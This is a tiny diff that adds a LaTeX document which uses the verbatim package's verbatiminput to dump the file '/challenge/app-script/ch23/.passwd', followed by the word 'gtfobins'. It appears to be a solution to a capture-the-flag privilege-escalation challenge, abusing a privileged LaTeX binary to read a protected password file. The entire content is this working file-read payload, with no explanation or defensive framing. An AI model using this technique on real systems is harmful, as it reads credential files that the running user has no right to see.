@@ -1,0 +1,4 @@
+\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/challenge/app-script/ch23/.passwd}\end{document}
+
+
+gtfobins
